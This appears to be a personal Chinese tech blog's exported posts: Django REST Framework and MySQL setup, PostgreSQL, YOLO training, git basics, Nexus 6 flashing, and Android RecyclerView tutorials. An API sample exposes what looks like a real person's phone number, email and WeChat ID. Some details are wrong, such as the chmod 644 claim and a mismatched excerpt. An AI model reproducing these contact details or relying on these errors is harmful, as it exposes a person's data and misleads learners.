简介时间过得好快，不知不觉这就是Django系列教程的第三部分了，这部分我们将在一分钟之内用django的一个第三方框架-Django restframework搭建我们的第一个api。首先闲话不多说让我们先安装一下这个框架：sudo pip3 install django-restframework ok，安装完之后能让我们新建一个project吧django-admin startproject ara 接着新建一个app：python3 manage.py startapp users ok这时候我们的项目结构应该是这样的：.├── ara│ ├── __init__.py│ ├── settings.py│ ├── urls.py│ └── wsgi.py└── users ├── __init__.py ├── admin.py ├── apps.py ├── models.py ├── tests.py └── views.py ok，简单易懂，接着还是我们配置一下restframework吧 Restframework配置配置这个框架请依照这个步骤来，缺一不可： 在settings.py中我们install一下 INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'users', 'rest_framework'] 在settings.py中添加这个 # using rest_framework setting this lineREST_FRAMEWORK = &#123; # Use Django's standard `django.contrib.auth` permissions, # or allow read-only access for unauthenticated users. 'DEFAULT_PERMISSION_CLASSES': [ 'rest_framework.permissions.DjangoModelPermissionsOrAnonReadOnly' ]&#125; ok，经过这个配置之后，我们就可以在项目中import restframework了。接下来我要向同志们展示一下这个东西到底有多么吊炸天！ 三步搞定一套API，增删改查！我说过只用三步，那我们就分三步来。 第1步： 当然是新建一个models 二话不多说直接复制粘贴代码：# -*- coding: utf-8 -*-from django.db import models# Create your models here.class User(models.Model): \"\"\" name: name of user, gender: user's gender wechat: user's wechat \"\"\" name = models.CharField(max_length=100, blank=False) gender = models.CharField(max_length=4, blank=True) birthday = models.DateField(blank=True) portrait_url = models.CharField(max_length=100, blank=True) home = models.CharField(max_length=20, blank=True) phone = models.CharField(max_length=17, blank=True) email = models.CharField(max_length=20, blank=True) wechat = models.CharField(max_length=20, blank=True) company = models.CharField(max_length=20, blank=True) occupation = models.CharField(max_length=20, blank=True) living_city = models.CharField(max_length=20, blank=True) def __str__(self): return self.name 第2步： 在app下新建serializers.py，写入这些代码 二话不多说直接复制粘贴代码：from rest_framework import serializers, viewsetsfrom users.models import Userclass UsersSerializer(serializers.ModelSerializer): class Meta: model = User fields = '__all__'# ViewSets define the view behavior.class UsersViewSet(viewsets.ModelViewSet): queryset = User.objects.all() serializer_class = UsersSerializer 在这里我们实现一个UsersSerializers以及一个UsersViewSet这两个类，这个序列化函数暂且不知道是干毛的，但是很显然这个函数的作用是把从数据库中查询的结果序列化为字符串。不过重点是这个ViewSet，这个东西就这么几行代码它就帮你实现好了增、删、改、查的所有功能。不是吹牛逼等一下我们来验证看看是不是。你会惊奇的发现，有了这个ViewSet之后我们都不用写view.py了！！！！！ 第3步： 配置urls二话不多说直接复制粘贴代码：from django.conf.urls import url, includefrom django.contrib import adminfrom users.serializers import UsersViewSetfrom rest_framework import routersrouter = routers.DefaultRouter()router.register(r'api/v1/users', UsersViewSet)urlpatterns = [ url(r'^admin/', admin.site.urls), url(r'^api-auth/', include('rest_framework.urls', namespace='rest_framework')), url(r'^', include(router.urls))] 配置urls要用到restframework中的router这个类，这个是一个路由器，或者说是分发器，request的网址分发过来我发给哪个view处理就有他来决定，但是很显然这里并没有发给任何一个view，而是直接发给了一个ViewSet，这个ViewSet结合我们的serializer就可以实现我们的返回json或者接受json的全套功能！就是这么的屌！屌的爆炸！！好吧，最后说一下urlpatterns里面的几个pattern，第一个是admin不需要多说，重点是最后一个我们include了router的urls，所以说你只需要按照router的网址来写即可，不过重点是router还实现了一个隐士查询也就是你可以加具体数字查询具体的detail。 Django restframework测试！说了这么多来测试一下呗！！我们输入：http://127.0.0.1:8000/api/v1/users 看看返回的结果：HTTP 200 OKAllow: GET, POST, OPTIONSContent-Type: application/jsonVary: Accept[ &#123; \"id\": 1, \"name\": \"金天\", \"gender\": \"男\", \"birthday\": \"1993-12-11\", \"portrait_url\": \"https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1593523098,2479335990&amp;fm=116&amp;gp=0.jpg\", \"home\": \"江西南昌\", \"phone\": \"15116123160\", \"email\": \"1195889656@qq.com\", \"wechat\": \"jintianilveu\", \"company\": \"\", \"occupation\": \"\", \"living_city\": \"\" &#125;, &#123; \"id\": 2, \"name\": \"Elgins\", \"gender\": \"男\", \"birthday\": \"1994-11-02\", \"portrait_url\": \"\", \"home\": \"\", \"phone\": \"\", \"email\": \"\", \"wechat\": \"\", \"company\": \"\", \"occupation\": \"\", \"living_city\": \"\" &#125;] 在网页中你可以直接测试POST PUT GET等方法，总是很牛逼有没有！！分分钟做一套API啊！！比java web快出了不知道多少倍！！！明天我们继续深入探测这个东西！！！！！","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://yoursite.com/tags/Django/"}]},{"title":"Django 2 MySQL and Blog","slug":"Django-2-MySQL-and-Blog","date":"2017-01-15T10:14:45.000Z","updated":"2017-01-26T10:42:12.000Z","comments":true,"path":"2017/01/15/Django-2-MySQL-and-Blog/","link":"","permalink":"http://yoursite.com/2017/01/15/Django-2-MySQL-and-Blog/","excerpt":"","text":"mysql usageIn this post I am going writting some useful commonds of mysql, hand this you can operate Database as cake. Change specific database encode ALTER DATABASE ara CHARACTER SET utf8; Change all database encode SET CHARACTER_SET_CONNECTTION=utf8;SET CHARACTER_SET_DATABASE=utf8;SET CHARACTER_SET_SERVER=utf8;SET CHARACTER_SET_CLIENT=utf8; Ultimate method to change encode of mysqlok, I have to admmit that above method you cannot really change mysql’s encode, it still be latin1 for character_database and character_server. But using this you can change the encode method forever. First of all, please make sure you have stop mysql.Step 1copy my-default.cnf to /etc/my.cnf, using: cp /usr/local/mysql/support-files/my-default.cnf /etc/my.cnf Step 2changing a exactly right to that file, make sure only you can write and read it, using:sudo chmod 644 my.cnf Step 3add this lines to the file:sudo vim my.cnf [client]default-character-set=utf8 under [mysqld] adding this:default-storage-engine=INNODBcharacter-set-server=utf8collation-server=utf8_general_ci ok, then save and quit, start mysql, and you will find:mysql&gt; show variables like \"%char%\";+--------------------------+---------------------------------------------------------+| Variable_name | Value |+--------------------------+---------------------------------------------------------+| character_set_client | utf8 || character_set_connection | utf8 || character_set_database | utf8 || character_set_filesystem | binary || character_set_results | utf8 || character_set_server | utf8 || character_set_system | utf8 || character_sets_dir | /usr/local/mysql-5.7.16-osx10.11-x86_64/share/charsets/ |+--------------------------+---------------------------------------------------------+8 rows in set (0.01 sec)","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://yoursite.com/tags/Django/"}]},{"title":"Django 1 Django和mysql","slug":"Django-1-Django上手教程","date":"2017-01-12T12:31:45.000Z","updated":"2017-01-26T10:44:52.000Z","comments":true,"path":"2017/01/12/Django-1-Django上手教程/","link":"","permalink":"http://yoursite.com/2017/01/12/Django-1-Django上手教程/","excerpt":"这个post是讲述django和mysql的故事，记录django常用命令以及mysql的python接口安装方法，环境为python3.6。","text":"这个post是讲述django和mysql的故事，记录django常用命令以及mysql的python接口安装方法，环境为python3.6。 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu。 Django大法作为一位极客，不会点服务端还真不行，现在什么都离不开云啊，最近一直想建站，app接口也要用到云，本来打算用java，可是想了一下java即使使用框架访问数据库的效率还是有点低，而我呢，python玩得这么6，人生苦短啊为何不用python，反正都是事先一样的东西，我们做的也不是淘宝天猫，不需要考虑太多并发的东西，因此从某种意义上来讲，使用django是一个非常不错的选择。好了闲话不多说，这是一个django之歌的系列，既然是歌那就得分乐章，不分逻辑了。 Django命令 [UPDATE] 2017-01-26 python3 manage.py createsuperuser 这个命领用来创建一个django的后台管理员用户名和密码。 Django的安装就不多说了，安装好python，比如mac下brew install pyton3就ok了，再次必须说明一下，我不太喜欢过时的东西，但是太新意味着踩坑，所以大家要做好踩坑的准备。Django安装好之后就可以直接用了，这里我收集一下django入门会用到的命令吧：django-admin startproject deepxpython3 manage.py startapp articlepython3 manage.py runserver 第一个命令是新建项目，第二个新建一个app，这里一个app其实就是项目中的一个功能模块，在我看来。新建好的django一般是这样的工程目录：.├── article│ ├── __init__.py│ ├── __pycache__│ │ └── __init__.cpython-36.pyc│ ├── admin.py│ ├── apps.py│ ├── migrations│ │ └── __init__.py│ ├── models.py│ ├── tests.py│ └── views.py├── lewisblog│ ├── __init__.py│ ├── __pycache__│ │ ├── __init__.cpython-36.pyc│ │ └── settings.cpython-36.pyc│ ├── settings.py│ ├── urls.py│ └── wsgi.py└── manage.py 这里article就是app，lewisblog是整个工程的名字。 Django和mysqlUPDATE这里增加一下，很多人说python3.6 安装mysql报错，解决方法是python3安装mysqlclient，网上很多方法都是过时，其他mysql的驱动并不适用python3，大家注意了啊！可以说这是一对好拍档，很多人说django自带的sqlite就很不错啊，使得sqlite很方便不用安装不用配置，数据库文件就在工程的目录下，访问简单快捷，但是呢，sqlite并太轻了，我们还是使用mysql吧，毕竟比较流行，而且一些语句也是我们常用的语句，因此可以说mysql是非常合适不过的啦。在配置mysql的时候要在上面的settings.py中设置：DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'lewisblog', 'USER': 'root', 'PASSWORD': 'root', 'HOST': '127.0.0.1', 'PORT': '3306', &#125; ok,在这里我们就设置好了数据库引擎以及数据库的名字和密码之类的东西，当然要想链接上数据库还得再mysql中新建则个数据库，数据库名字随便取罗。然后我们要干啥？对了这个settings，在你新建了一个app之后记得在这里登记一下，这里可以控制是哪些app有效。 Django和Model很多人都说DJango是一个template，为什么这么说，思考一下，很多其他库做后台操作数据库都免不了要写一些数据库查询语句，增删改查都要连接数据库查询有没有然后增删改，但是这样做的效率其实是非常低的。很多不必要的操作都是在这里产生的。而Django在这个地方就不同，它自己实现一个很强大的基类，就是model，这就是一个数据库模型，在model里面你可以找到数据库里面的各种数据类型，甚至在时间的操作上比数据库还简单。比如我们要写一个article的表，我们不用再数据库里面建了，建好了然后在写一个数据类，这在java里面你就得干这个脏活，但是在django里你就不需要重复无意义的事情了，你只需要建一个model，然后migrate一下，你就可以在mysql中看到你新建的表了。怎么样方便吧，哎写了这么多肚子有饿了。看来明天得好好吃一顿了。贴一个model新建的类的代码：(在上面的app下面的models.py中)from django.db import models# Create your models here.class Article(models.Model): title = models.CharField(max_length=100, blank=True) category = models.CharField(max_length=50, blank=True) author = models.CharField(max_length=50, blank=True) date_time = models.DateTimeField(auto_now_add=True) content = models.TextField(blank=True, null=True) def __unicode__(self): return self.title class Meta: ordering = ['-date_time'] 看看，所见即所得，你一旦实现了这个model之后你就不用管mysql了，以后插入数据什么的只需要实现这个类就行了，简直是方便的有点蛋疼啊！新建了这个model之后，你要把这个应用到mysql需要下面两条啊语句：python3 manage.py makemigrationspython3 manage,py migrate 第一条意思是我把model在本地生成一个migrations文件夹，里面要记录你对数据的操作，而第二个命令就是你对这个操作施加到数据库中。两条命令按顺序执行才能deploy到数据库里面，这时候打开mysql就可以看到我们的表了：mysql&gt; USE lewisblog;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; SHOW TABLES;+----------------------------+| Tables_in_lewisblog |+----------------------------+| article_article || auth_group || auth_group_permissions || auth_permission || auth_user || auth_user_groups || auth_user_user_permissions || django_admin_log || django_content_type || django_migrations || django_session |+----------------------------+11 rows in set (0.00 sec) 看到没，我们的模型已经转换成表了。6不6！！！ Django的mysql shell其实Django内置了一个shell，在这个shell里面你可以模拟mysql对数据库进行增删改查，但是呢，要进入这个shell还是得默默的进入，不要让任何人知道：python3 manage.py shell 进入shell，这是一个神奇的地方，我们执行以下这个命令：&gt;&gt;&gt; from article.models import Article&gt;&gt;&gt; Article.objects.create(title = 'hello world.', category = 'django', author = 'Lewis Jin', content = 'Today I leared Django and it is very nice!') &lt;Article: Article object&gt; 接着你甚至不用migrate就可以直接在mysql中查看到我们已经成功地添加了一条记录在数据库中！你就说6不6！！mysql&gt; mysql&gt; SELECT * FROM article_article;+----+--------------+----------+-----------+----------------------------+--------------------------------------------+| id | title | category | author | date_time | content |+----+--------------+----------+-----------+----------------------------+--------------------------------------------+| 1 | hello world. | django | Lewis Jin | 2017-01-12 13:25:13.273888 | Today I leared Django and it is very nice! |+----+--------------+----------+-----------+----------------------------+--------------------------------------------+ 这是增，改和删也很简单：&gt;&gt;&gt; a = Article.objects.get(id=1)&gt;&gt;&gt; a.title'hello world.'&gt;&gt;&gt; a.title = 'Hello World'&gt;&gt;&gt; a.title'Hello World'&gt;&gt;&gt; a.delete() 本篇章结语基本上看完这些就可以入门了，接下来我们更加深入的剖析django，我们要充分利用这个利器，来实现我们想要的web程序，让云变的触手可及！！","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://yoursite.com/tags/Django/"}]},{"title":"Mac下安装和使用postgreSQL","slug":"Mac下安装和使用postgreSQL","date":"2017-01-02T07:02:18.000Z","updated":"2017-02-02T13:22:51.000Z","comments":true,"path":"2017/01/02/Mac下安装和使用postgreSQL/","link":"","permalink":"http://yoursite.com/2017/01/02/Mac下安装和使用postgreSQL/","excerpt":"本文介绍Mac下如何对nexus进行刷机，实际上还是非常简单的，10分钟即可搞定，然后就是nexu6的root教程","text":"本文介绍Mac下如何对nexus进行刷机，实际上还是非常简单的，10分钟即可搞定，然后就是nexu6的root教程 本文由在当地较为英俊的男子金天撰写，大家有任何疑问欢迎联系我: jintianiloveu Mac下快速安装postgreSQL开始开车之前我们花一分钟的时间来安装一下这个，说是一分钟实际上一分钟都不需要，如果你是开发者，mac上应该安装了brew吧，我们直接用brew安装。这里多说一句如果你用postgreSQL官网的安装包的话，虽然简单但是你会得到一个全家桶，我建议直接用代码安装，用brew就一行命令：brew install postgresql 简单方便快捷，等一下我对比一下mysql和postgresql的上手难易度，你会发现mysql like a shit，尤其是在mac上，我曹，鸡巴不知道哪里好端端的就会出问题。好了不多说了，安装好了测试一下：新建一个数据库：createdb mydb 访问这个数据库pslq mydb 这样你就完成了postgresql从入门到精通了。 为什么是postgreSQL而不是MySQL？在选择数据时其实是一个很重要的问题，当然如果你是一个高手，任何数据库应该都没问题，但是如果你是入门级的开发者或者是只是用来做产品，那我建议用postgresql。从这个安装和上手步骤你就会发现，postgre更加完美，方便。你甚至不需要关心任何其他的东西。只需要安装，新建数据库，使用它。 postgreSQL逆天功能个人觉得mysql应该退出历史舞台的很大原因是，用的人太多了。大部分还是固守陈旧，而我喜欢简单的东西，什么东西简单就能节省我的时间我会欢迎他，而postgresql说实话，很简单，简单到什么地步，你需要用下面的命令来感受一下： 查看所有数据库psql -l 就是这么简单。 切换数据库\\c newdatabase postgreSQL只是一个工具不过到头来，不管是mysql还是postgresql，都是只是一个工具，我们如何用它来制作我们的产品才是真正重要的东西。毫无疑问，postgresql是django强烈建议的数据库，就单单支持中文编码而言，如果你用mysql你就会遇到很多编码问题，但是pg没有这个问题。接下来我们要用django来搭配postgresql，创造一些产品。","categories":[],"tags":[]},{"title":"Yolo训练自己的数据集教程 Newest(2016-12-23)","slug":"Yolo训练自己的数据集教程-Newest-2016-12-23","date":"2016-12-22T10:27:38.000Z","updated":"2017-02-02T06:04:53.000Z","comments":true,"path":"2016/12/22/Yolo训练自己的数据集教程-Newest-2016-12-23/","link":"","permalink":"http://yoursite.com/2016/12/22/Yolo训练自己的数据集教程-Newest-2016-12-23/","excerpt":"yolo教程","text":"yolo教程 Yolo darknet训练自己的数据集教程(Newest 2016.12.23) 经过两天的折腾终于搞定了Yolo训练自己的数据集的过程，整个过程其实并不繁琐，只是网上一些过时的教程已经不适用了，依照那个反而让大家各种出出错，加之Yolo中文教程过少，因此本大神再次放一个，如果大家有任何问题直接在文章后面评论即可，笔者看到之后给予第一时间回复。 先插一句，Atom中文不能跟随窗口wrap文字的同学，打开settingview，设置soft wrap即可，百度上的答案真的是渣 Yolo简介在训练数据集之前，相信大家对yolo应该有一些了解，本文所采用的测试环境为：Ubuntu 16.04 + opencv2.4 + cuda8 + cudnn5.1 PLUS GTX1080，当然这个硬件不是必须，在下只是偶尔装一下逼。Yolo基于darknet编写，而编译draknet的时候最好安装一下opencv，因为没有opencv图不会自动弹出，没有那种快感，你懂得，不知道如何安装opencv的同学去我之前写的几个博客中搜寻。均能够找到最新的答案。 yolo之所以快，是因为它的方法和fastrcnn以及其他detect算法不同，而采用了很多ssd的思想，在最新的更新中，yolo也改进了他们的算法，在pascal voc数据集上取得了不错的结果。本文将主要利用yolo来做realtime detect，对自己的数据进行训练和预测。 开始开车OK，闲话不多说，让我们直接上车，这次是无人驾驶，速度比较快，大家系好安全带。 Step 1 编译darknet，并熟悉目录结构 第一部分没有什么说的，很简单其实，首先clone代码到本地~目录：cd ~git clone https://github.com/pjreddie/darknetcd darknetmake 这个时候我们在home根目录就有了darknet了。直接编译，不需要修改任何参数，当然如何你是土豪，你有GTX1080,像我一样（手动装比）。可以编译一下Makefile里面的参数。为了防止大家出错我还是说一下，直接改标志为：GPU=1CUDNN=1OPENCV=0DEBUG=0 如果你的cuda没有设置环境变量，nvcc的路径也设置一下：NVCC=/usr/local/cuda/bin/nvcc 不要想的很复杂其实很简单。ok，现在直接make，编译就可以了。 Step 2 准备自己的数据集 好了我们现在有了darktnet，但是我要那个匡出物体的掉炸天的图怎么搞？莫慌，我们先用darknet自带的测试数据来测试一下。首先呢，yolo这个网络是训练VOC数据集得来的，20中物体都能识别出来，我们直接下载已经训练好的权重然后来预测一张图片看看：wget http://pjreddie.com/media/files/yolo.weights 这时候我们就下载好了yolo.weights，在darknet目录下。然后我们就可以用这个权重来预测啦！./darknet detect cfg/yolo.cfg yolo.weights data/dog.jpg detect命令意思是，检测，后面还有i一个命令是detector train，后者是训练的命令，预测用detect，cfg/yolo.cfg就是yolo这个网络的结构文件，后面是权重，最后后面是图片。ok，enter你就可以看到狗和自行车了！～这就搞定了darknet，那么问题来了。自己的数据集怎么准备呢？重点来了重点来了： images 准备 首先，把你的图片放到一个/images 文件夹下面，文件名的名字要有规律，比如0001.jpg,0002.jpg….0100.jpg; xml 准备 我相信很多人都需要用图片标注工具来对图片生成标注信息来训练，但是图片标注工具生成的多半是xml的标签信息。darknet需要的label并不是xml格式，而是一张图片一个txt的形式，txt中是你标注的物体方框坐标。后面我会放出几个脚本来处理。 xml 转 darknet label xml转为darknet需要的label形式，一张图片一个标注信息。 生成图片路径最后一部我们要生成两个txt文件，一个是train.txt,一个是valid.txt，train.txt包含了你训练图片需要的图片路径，没一行都是一张图片的路径，为了防止出错，后面我放出一个统一的脚本生成这个train.txt。 Step 3 训练之前修改darknet参数 接下来就要修改darknet的参数了，只要修改/cfg/voc.data 文件，因为yolo是为了voc而存在的，为了不修改源代码的情况下来训练我们的数据，建议直接修改voc.data而不是修改voc.data文件名。修改内容如下：classes= 20train = /home/pjreddie/data/voc/train.txtvalid = /home/pjreddie/data/voc/2007_test.txtnames = data/voc.namesbackup = /home/pjreddie/backup/ 这里，classes就是你数据集的类别，names你的新建一个，在data下面，然后在这里指向它，仿照voc.names 新建即可。修改train.txt valid.txt的路径，用绝对路径哦，防止出错，因为你darknet和数据可能不再一个目录。ok，这就setup完了，接着直接训练。不过训练之前获取一个预处理的权重：curl -O http://pjreddie.com/media/files/darknet19_448.conv.23 然后，train：./darknet detector train cfg/voc.data cfg/yolo-voc.cfg darknet19_448.conv.23 对了，如果你上面改了voc.data的文件名，这里也要改，所以说其实改也是可以的。然后yolo-voc.cfg就可以不改了。 Step 4 yolo训练出的模型预测./darknet detect cfg/yolo-voc.cfg /backup/voc.weights data/sample.jpg 这里不要和直接copy我的代码，cfg/yolo-voc.cfg就是我们训练的网络。后面是训练保存的权重，最后是你要预测的图片。OK，看看结果咋么样～","categories":[],"tags":[]},{"title":"夜有所思","slug":"夜有所思","date":"2016-12-11T15:35:30.000Z","updated":"2016-12-12T02:20:36.000Z","comments":true,"path":"2016/12/11/夜有所思/","link":"","permalink":"http://yoursite.com/2016/12/11/夜有所思/","excerpt":"本文是我的一个随笔","text":"本文是我的一个随笔 你有过思念的感觉吗？ 桃花谢了春红，太匆匆，却是朝来风雨晚来风岁月悄然流淌，我们也在成长，可是在成长的岁月里那些留给我们的感动我们还记得多少呢？以前只有离别家乡的时候才会与依依不舍之情，现在离开的这个地方不是家乡，却有着跟家乡一样的感觉，有着牵挂的人，这也许就是一种魂牵梦绕的情愫吧。今天把博客从实验室搬到了自己的笔记本，宾至如归，所有的事情我都想好好的握在手里，不至于等到失去之后我才后悔莫及。好吧这其实是一个测试，测试一下博客有没有迁移成功，也不能太伤感了，哎。测试一下，再次测试一下！！！","categories":[],"tags":[]},{"title":"git命令删除当前远程仓库依赖","slug":"git命令删除当前远程仓库依赖","date":"2016-12-11T13:51:12.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/11/git命令删除当前远程仓库依赖/","link":"","permalink":"http://yoursite.com/2016/12/11/git命令删除当前远程仓库依赖/","excerpt":"git命令简介","text":"git命令简介 学会使用git命令，不仅仅可以远程操控一切，还可以节省很多体力劳动，比如插优盘拔优盘.. 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ git命令使用简介git命令其实非常简单，但是网上的教程大多数都是乱七八糟，误人子弟，其实要我来讲，只需要记住一个概念：git是将本地仓库对接远程仓库的工具，这里记住有两个名词，一个本地仓库一个远程仓库，那么必然是两个仓库，很多人在后面遇到很多问题都是不明白这两个概念造成的。使用之前首先第一步用git初始化，然后把所有文件添加到本地仓库，注意一定要添加之本地仓库，而在添加本地仓库的时候，如果你的代码有修改，那么就得commit，所谓commit就是执行，确保执行，加上你的注解，防止后面你不知道改了哪个地方。然后才是git remote add origin http://github.com/..最后才是push所以说一般的git使用套路是这样的：git initgit add .git commit -a -m \"first commit\"git remote add origin http://github.com/jinfagang/Morph.gitgit push origin master 注意这里为什么要添加到origin而不是brigin或者其他名字，其实是可以的，只是我们习惯拔本地仓库明明为origin。 git修改远程仓库有时候我们需要修改一下远程仓库的依赖，很简单git remote remove origin 直接拔本地的remote仓库删除即可。","categories":[],"tags":[]},{"title":"Mac下为nexus6刷入官方系统并root","slug":"Mac下为nexus6刷入官方系统并root","date":"2016-12-05T07:02:18.000Z","updated":"2016-12-05T07:47:23.000Z","comments":true,"path":"2016/12/05/Mac下为nexus6刷入官方系统并root/","link":"","permalink":"http://yoursite.com/2016/12/05/Mac下为nexus6刷入官方系统并root/","excerpt":"本文介绍Mac下如何对nexus进行刷机，实际上还是非常简单的，10分钟即可搞定，然后就是nexu6的root教程","text":"本文介绍Mac下如何对nexus进行刷机，实际上还是非常简单的，10分钟即可搞定，然后就是nexu6的root教程 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu 安装adb直接用homebrew安装即可： brew install android-platform-tools 下载google官方镜像这个直接按照链接下载即可，不用担心GFW的问题，貌似下载速度还很快： 最新的7.0系统的下载链接：https://dl.google.com/dl/android/aosp/shamu-nbd91p-factory-987282ff.zip 最新的6.0.1系统的下载链接：https://dl.google.com/dl/android/aosp/shamu-mob31k-factory-49a4de6b.zip 解锁bootloader(如果device是locked状态)关机，按电源键＋音量下开机。在Mac终端上运行 fastboot oem unlock 一键安装将下载的原生系统zip包解压，然后到切换到解压之后的目录，在终端执行 ./flash-all.sh OK，重启既可进入新的系统。 root方法需要下载supersutwrpElementalX","categories":[],"tags":[]},{"title":"Android开车第一弹-MaterialDesign设计规范","slug":"Android开车第一弹-MaterialDesign设计规范","date":"2016-12-04T14:10:02.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/04/Android开车第一弹-MaterialDesign设计规范/","link":"","permalink":"http://yoursite.com/2016/12/04/Android开车第一弹-MaterialDesign设计规范/","excerpt":"本文是Android学的一个随笔","text":"本文是Android学的一个随笔 会iOS再来学Android，一切就像行云流水一样融会贯通，从某种意义上来讲，Android比iOS简单，iOS能够实现更精细的布局，但是也更复杂。Android大条随意，这也是为什么我想学习它的原因。 本文由中南大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 自定义ToolBar 学习Android一个很重要的问题就是自定义一个美观的toolbar，而很多人不懂得设计规范，各种直接拖按钮上toolbar，太猥琐了。人家google明明有标准的规范为什么不用，非得自作聪明的乱加。好了不多说了，自顶一个一个toolbar步骤如下： 更改主题为NoActionBar这是第一步，也是最重要的一步，要用toolbar，首先把Actionbar去掉。去掉的方法也很简单，直接设置styles.xml：&lt;style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.NoActionBar\"&gt; &lt;!-- Customize your theme here. --&gt; &lt;item name=\"colorPrimary\"&gt;@color/colorPrimary&lt;/item&gt; &lt;item name=\"colorPrimaryDark\"&gt;@color/colorPrimaryDark&lt;/item&gt; &lt;item name=\"colorAccent\"&gt;@color/colorAccent&lt;/item&gt; &lt;item name=\"android:actionMenuTextColor\"&gt;@color/colorWhite&lt;/item&gt;&lt;/style&gt; 这样以来又有个问题，这里设置了主题是light，那么toolbar的文字就会变成黑色，我们进一步定义一个toolbar的theme:&lt;style name=\"ToolbarTheme\" parent=\"@style/ThemeOverlay.AppCompat.ActionBar\"&gt; &lt;item name=\"actionMenuTextColor\"&gt;@android:color/white&lt;/item&gt; &lt;item name=\"android:textColorPrimary\"&gt;@android:color/white&lt;/item&gt; &lt;item name=\"android:popupMenuStyle\"&gt;@style/Platform.ThemeOverlay.AppCompat.Light&lt;/item&gt;&lt;/style&gt; 这里定义了toolbar主题的文字颜色。你设置了NoActionbar之后，实际上在AndroidStudio上的designer就没有ActionBar了，还需要从空间中拖入一个toolbar到actiivity_main.xml，这样的话我们就实现了，toolbar。但是只是一个toolbar我们还没有加入menu 添加menu添加menu，先不管代码，新建一个menu的布局文件，直接拖入menu即可，如果你要想menu在toolbar显示呢就设置app:showAsAction=\"always\" AndroidStudio现在有个好处就是都可以直接在界面上设置了，甚至不用写代码。然后我们在activity java文件中写代码：Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);setSupportActionBar(toolbar); 这两行代码就设置了我们的toolbar为actionbar了。接着处理menu事件，首先导入包：import android.view.Menu;import android.view.MenuItem; 不导入包，ide不会提示你重写哪几个方法。所以还是导入一下比较好。接着我们就可以开车了：public boolean onCreateOptionsMenu(Menu menu)&#123; getMenuInflater().inflate(R.menu.toolbar_menu, menu); return true;&#125;public boolean onOptionsItemSelected(MenuItem item)&#123; switch (item.getItemId())&#123; case R.id.settings: System.out.println(\"====&gt;settings\"); break; case R.id.more: System.out.println(\"=====&gt;more\"); break; case R.id.about: System.out.println(\"====&gt;about\"); break; default: break; &#125; return true;&#125; 这两个方法就可以实现那啥了。 使用recyclerview学习一个移动操作系统必须得学习list的使用，在安卓中就是recyclerview，在iOS中就是tableview和collectionview。扯远了，安卓使用recyclerview其实也是很简单的。 在主界面中拖入一个recyclerview这个不需要多说，有手的人都能托，而且大家的手又都这么健壮… 新建一个recyclerview item的布局文件我不得不说一下安卓跟iOS开发的巨大不同啊，iOS讲究的是精细，美观，所以布局是个很头疼的问题，而安卓就不一样，不管你怎么拖好像它都能帮你自动适配，不过安卓也很难做出iOS那样精细的页面，不过没有关系，好在我们的安卓手机屏幕都很大，加上我们的material design还是非常美观的，也非常符合这种设计语言和风格。、布局文件随便拖入几个控件或者textview，接下来我们就写控制器来控制他们。 写适配器，类似于iOS中的tableviewcellcontroller适配器也很简单，首先你要导入包，否则不会提示你重写的方法。 import android.content.Context;import android.support.v7.widget.RecyclerView;import android.support.v7.widget.RecyclerView.*;import android.view.LayoutInflater; 貌似这些包都要用到。没有关系，接下来我们就重写方法了，一个完整的适配器例子如下：public class RecyclerViewAdapter extends RecyclerView.Adapter&lt;RecyclerViewAdapter.MyViewHolder&gt; &#123; private Context context; private List&lt;String&gt; data; public RecyclerViewAdapter(Context context, List&lt;String&gt; data)&#123; this.context = context; this.data = data; &#125; public RecyclerViewAdapter.MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType)&#123; View view = LayoutInflater.from(context).inflate(R.layout.list_item_layout, null); return new MyViewHolder(view); &#125; public void onBindViewHolder(RecyclerViewAdapter.MyViewHolder holder, int position)&#123; String res = data.get(position); holder.tv1.setText(\"nihao\"); &#125; public int getItemCount()&#123; return 20; &#125; class MyViewHolder extends ViewHolder&#123; TextView tv1; public MyViewHolder(View view)&#123; super(view); tv1 = (TextView) view.findViewById(R.id.textView); &#125; &#125;&#125; 最后一部，找到recyclerview，设置适配器最后一步很简单，直接贴代码了RecyclerView recyclerView = (RecyclerView) findViewById(R.id.recyclerView);ArrayList&lt;String&gt; dataArray = new ArrayList&lt;String&gt;();for (int i = 1; i&lt;50; i++)&#123; dataArray.add(\"hello\");&#125;LinearLayoutManager manager = new LinearLayoutManager(this);manager.setOrientation(LinearLayoutManager.VERTICAL);recyclerView.setLayoutManager(manager);recyclerView.setItemAnimator(new DefaultItemAnimator());RecyclerViewAdapter adapter = new RecyclerViewAdapter(this, dataArray);recyclerView.setAdapter(adapter);","categories":[],"tags":[]},{"title":"mxnet开车教程series1-mnist上手","slug":"mxnet开车教程series1-mnist上手","date":"2016-12-03T13:50:54.000Z","updated":"2016-12-11T15:23:42.000Z","comments":true,"path":"2016/12/03/mxnet开车教程series1-mnist上手/","link":"","permalink":"http://yoursite.com/2016/12/03/mxnet开车教程series1-mnist上手/","excerpt":"mxnet入门中文教程，让我们从mnist果蝇数据集开始开车","text":"mxnet入门中文教程，让我们从mnist果蝇数据集开始开车 